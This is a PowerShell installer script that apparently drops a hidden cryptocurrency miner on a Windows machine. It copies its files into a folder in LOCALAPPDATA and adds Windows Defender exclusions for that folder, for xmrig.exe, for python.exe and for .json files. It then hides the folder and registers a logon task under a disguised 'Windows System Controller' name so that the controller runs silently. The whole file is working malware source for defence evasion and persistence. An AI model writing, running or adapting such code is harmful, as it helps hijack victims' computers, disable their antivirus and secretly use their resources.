param(
    [string]$TaskName = "Windows System Controller",
    [string]$ScriptName  = "controller.py"
)

try {
    # --- Detect source folder ---
    if ($PSScriptRoot -and (Test-Path $PSScriptRoot)) {
        $sourceDir = $PSScriptRoot
    } else {
        $sourceDir = Split-Path -Parent (Get-Item $MyInvocation.MyCommand.Path).FullName
    }
    if (-not (Test-Path $sourceDir)) { $sourceDir = Get-Location }

    Write-Host "Copying from: $sourceDir"

    # --- Prepare destination (SAFE location) ---
    $safeDir = Join-Path $env:LOCALAPPDATA "SystemController"
    if (-not (Test-Path $safeDir)) {
        New-Item -ItemType Directory -Force -Path $safeDir | Out-Null
        Write-Host "Created $safeDir"
    }

    # --- Copy files safely ---
    Write-Host "Copying files..."
    $exclude = @("System Volume Information", "$RECYCLE.BIN")

    Get-ChildItem -LiteralPath $sourceDir -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object {
            -not ($exclude -contains $_.PSChildName) -and
            -not ($exclude -contains $_.Parent.Name)
        } |
        ForEach-Object {
            $relPath = $_.FullName.Substring($sourceDir.Length).TrimStart('\')
            $destPath = Join-Path $safeDir $relPath
            $destFolder = Split-Path $destPath -Parent
            if (-not (Test-Path $destFolder)) {
                New-Item -ItemType Directory -Force -Path $destFolder | Out-Null
            }
            Copy-Item -LiteralPath $_.FullName -Destination $destPath -Force
        }

    Write-Host "Files copied successfully to $safeDir"

    # ======================================================================
    # === WINDOWS DEFENDER EXCLUSIONS + VERIFICATION =======================
    # ======================================================================
    Write-Host "Adding Windows Defender exclusions..."

    $exclusions = @(
        @{ Type="Path";      Value="$safeDir" }
        @{ Type="Process";   Value="$safeDir\controller.py" }
        @{ Type="Process";   Value="$safeDir\xmrig.exe" }
        @{ Type="Process";   Value="python.exe" }
        @{ Type="Extension"; Value=".json" }
    )

    foreach ($item in $exclusions) {
        try {
            switch ($item.Type) {
                "Path"      { Add-MpPreference -ExclusionPath      $item.Value -ErrorAction Stop }
                "Process"   { Add-MpPreference -ExclusionProcess   $item.Value -ErrorAction Stop }
                "Extension" { Add-MpPreference -ExclusionExtension $item.Value -ErrorAction Stop }
            }
            Write-Host "Added exclusion: $($item.Type) → $($item.Value)"
        }
        catch {
            Write-Host "Warning: Failed to add exclusion $($item.Value)" -ForegroundColor Yellow
        }
    }

    # --- Verification ---
    Write-Host "`nVerifying Defender exclusions..."
    $current = Get-MpPreference

    function Test-Exclusion($type, $val, $current) {
        switch ($type) {
            "Path"      { return $current.ExclusionPath      -contains $val }
            "Process"   { return $current.ExclusionProcess   -contains $val }
            "Extension" { return $current.ExclusionExtension -contains $val }
        }
    }

    foreach ($item in $exclusions) {
        if (Test-Exclusion $item.Type $item.Value $current) {
            Write-Host "[OK] $($item.Type) exclusion verified: $($item.Value)" -ForegroundColor Green
        } else {
            Write-Host "[FAIL] Missing exclusion: $($item.Type) → $($item.Value)" -ForegroundColor Red
        }
    }

    # ======================================================================
    # === PYTHON INSTALLATION + PSUTIL INSTALL ====================================
    # ==============================================================================

    $pythonExe = "C:\Program Files\Python312\python.exe"
    $pythonWExe = "C:\Program Files\Python312\pythonw.exe"

    # Install Python if missing
    if (-not (Test-Path $pythonExe)) {
        Write-Host "Python not found. Installing Python 3.12.2..."
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe" -OutFile "$env:TEMP\python_installer.exe"
        Start-Process "$env:TEMP\python_installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
    } else {
        Write-Host "Python is already installed."
    }

    # Install psutil globally
    Write-Host "Installing psutil and requests..."
    & $pythonExe -m pip install psutil requests

    # ======================================================================
    # === HIDE INSTALL FOLDER ======================================================
    # ==============================================================================

    try {
        $folder = Get-Item -LiteralPath $safeDir
        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Host "Folder set to hidden."
    } catch {
        Write-Host "Warning: could not set folder attributes." -ForegroundColor Yellow
    }

    # ======================================================================
    # === CREATE SCHEDULED TASK (DIRECT pythonw.exe) ================================
    # ==============================================================================

    Write-Host "Creating scheduled task..."
    $taskCreated = $false

    try {
        $scriptPath = Join-Path $safeDir $ScriptName

        $action   = New-ScheduledTaskAction -Execute $pythonWExe -Argument $scriptPath
        $trigger  = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited

        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Description "Runs controller silently at logon" -Force
        Write-Host "Scheduled task created."
        $taskCreated = $true
    }
    catch {
        Write-Host "PowerShell task creation failed. Trying schtasks.exe..."

        $scriptPath = Join-Path $safeDir $ScriptName
        schtasks.exe /Create /TN $TaskName /TR "`"$pythonWExe`" `"$scriptPath`"" /SC ONLOGON /RL LIMITED /F /RU $env:USERNAME
        $taskCreated = $true
    }

    # Verification
    if ($taskCreated) {
        Write-Host "Verifying task..."
        schtasks.exe /Query /TN $TaskName 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Verification passed: Task '$TaskName' exists." -ForegroundColor Green
        } else {
            Write-Host "Verification failed." -ForegroundColor Red
        }

        Write-Host ""
        Write-Host "Installed to: $safeDir"
        Write-Host "Scheduled task runs:"
        Write-Host "  $pythonWExe $scriptPath"
    }

}
catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.Exception.StackTrace
}
finally {
    Write-Host ""
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
